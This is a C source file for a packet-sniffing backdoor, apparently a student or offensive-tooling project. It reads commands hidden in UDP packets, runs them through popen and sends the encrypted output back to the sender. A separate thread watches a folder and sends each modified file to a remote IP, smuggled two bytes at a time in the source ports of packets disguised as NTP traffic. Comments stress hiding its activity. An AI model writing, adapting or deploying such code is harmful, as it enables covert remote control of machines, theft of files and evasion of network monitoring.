#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/inotify.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <pthread.h>

#include "server.h"
#include "util.h"
#include "ntp.h"
#include "inet.h"

#define ETHER_IP_UDP_LEN 44
#define SRC_OFF 		28 // Source address, so we know where to send results
#define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port

#define EVENT_SIZE (sizeof (struct inotify_event))
#define BUF_LEN	(1024 * (EVENT_SIZE + 16))
#define ALL_MASK 0xffffffff

struct bpf_program fltr_prog;

struct exfil_pack
{
	uint32 ipaddr;
	char  *folder;
};

void pcap_start(const char *fltr_str, int duplex, uint32 ipaddr, char *folder)
{
	pcap_t* nic;
	char errbuf[PCAP_ERRBUF_SIZE];
	pthread_t exfil_thread;
	struct exfil_pack expack;

	// Setup Exfil Watch
	expack.ipaddr = ipaddr;
	expack.folder = folder;
	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);

	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
		error(errbuf);
	
	// Get packet fltr_str from arguments
	if (pcap_compile(nic, &fltr_prog, fltr_str, 0, 0) == -1)
		error("pcap_compile");

	// Set fltr_str for captures
	if (pcap_setfilter(nic, &fltr_prog) == -1)
		error("pcap_setfltr_str");

	// Start capturing, make sure to heavily restrict our CPU usage.
	while (TRUE)
	{
		if (pcap_dispatch(nic, -1, pkt_handler, (u_char*)duplex) < 0)
			error("pcap_loop");
		usleep(5000); // sleep 5ms
	}
	
	pthread_join(exfil_thread, NULL);
}

void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
	char *ptr;
	char *data;
	char type;
	int duplex = (int) user;
	uint32 ip;
	short port;
	int len;

	/* Step 1: locate the payload portion of the packet */
	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
	if (pkt_info->caplen - ETHER_IP_UDP_LEN <= 0)
		return;

	/* Step 2: check payload for backdoor header key
	if (0 != memcmp(ptr, HDR_KEY, hdr_len))
		return; */

	len = pkt_info->caplen - ETHER_IP_UDP_LEN;

	data = getTransmission(ptr, &len, &type);
	if (data == NULL)
		return;

	if (type == CMD_TYP)
	{
		// Grab the source in case we need to send the result back
		ip = *(uint32*)(packet + SRC_OFF);
		port = *(uint16*)(packet + PORT_OFF);

		// Step 6: Execute the command
		execute(data, ip, port, duplex);
	}
}

void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
{
	FILE *fp;
	char out[MAX_LEN];
	int sock = 0;
	struct sockaddr_in saddr;
	char buff[MAX_LEN];
	char * enc = *buff;

	// Run the command, grab stdout
	fp = popen(command, "r");

	// Prep for network comm
	if (duplex)
	{
		bzero(&saddr, sizeof(saddr));
		saddr.sin_family = AF_INET;
		saddr.sin_addr.s_addr = ip;
		saddr.sin_port = port;

		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sock < 0)
			perror("socket");
	}

	// Read output line by line
	while (fgets(out, MAX_LEN -1, fp) != NULL)
	{
		if (duplex)
		{
			int len = strlen(out);
			
			enc = encrypt(PASSKEY, out, len);

			enc = buildTransmission(enc, &len, RSP_TYP);

			sendto(sock, enc, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));

			free(enc);
		}
		else
			; //Do nothing so we don't give ourselves away.
			//printf("%s", out);
	}

	pclose(fp);
}

void exfil_send(uint32 ipaddr, char *path)
{
	int buflen;
	char buffer[MAX_LEN];
	char *pbuf;
	FILE *file;

	file = open_file(path, FALSE);

	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0)
	{
		pbuf = buffer;

		// Pad non-even sequences with a space ...
		if (buflen % 2 != 0)
		{
			buffer[buflen - 1] = ' ';
			buffer[buflen] = 0;
			++buflen;
		}

		for (int i = 0; i < buflen;)
		{
			char *enc;
			ushort src_port = 0;
			ushort dst_port = 0;

			enc = encrypt(SEKRET, pbuf, 2);

			enc = buildTransmission(enc, &buflen, XFL_TYP);

			src_port = (enc[0] << 8) + enc[1];
			dst_port = PORT_NTP;
			free(enc);

			_send(ipaddr, src_port, dst_port, TRUE);

			i += 2;
			pbuf += 2;
			usleep(SLEEP_TIME);
		}
	}
}

void *exfil_watch(void *arg)
{
	int fd, wd, ret;
	static struct inotify_event *event;
	fd_set rfds;
	struct exfil_pack expck;
	uint32 ipaddr;
	char  *folder;

	expck = *(struct exfil_pack*)arg;
	ipaddr = expck.ipaddr;
	folder = expck.folder;

	fd = inotify_init();
	if (fd < 0)
		error("inotify init");

	wd = inotify_add_watch(fd, folder, (uint32)IN_MODIFY);

	if (wd < 0)
		error("inotify add watch");

	FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

	while (TRUE)
	{
		int i = 0;
		int len;
		char buf[BUF_LEN];

		ret = select(fd + 1, &rfds, NULL, NULL, NULL);
		len = read(fd, buf, BUF_LEN);

		if (len < 0 && errno != EINTR) // need to reissue system call
			error("read");
		else if (len == 0) // BUF_LEN too small?
			error("inotify buffer too small");

		while (i < len)
		{
			event = (struct inotify_event *) &buf[i];

			if (event->len)
			{
				char path[MAX_LEN];
				strncpy(path, folder, MAX_LEN);
				strcat(path, "/");
				strcat(path, event->name);
				exfil_send(ipaddr, path);
			}

			i += EVENT_SIZE + event->len;
		}

		if (ret < 0)
			error("select");
		else if (!ret)
			printf("timed out\n");
	}

	printf ("Cleaning up and Terminating....................\n");
	fflush (stdout);
	ret = inotify_rm_watch(fd, wd);
	if (ret)
		error("inotify rm watch");
	if (close(fd))
		error("close");
}
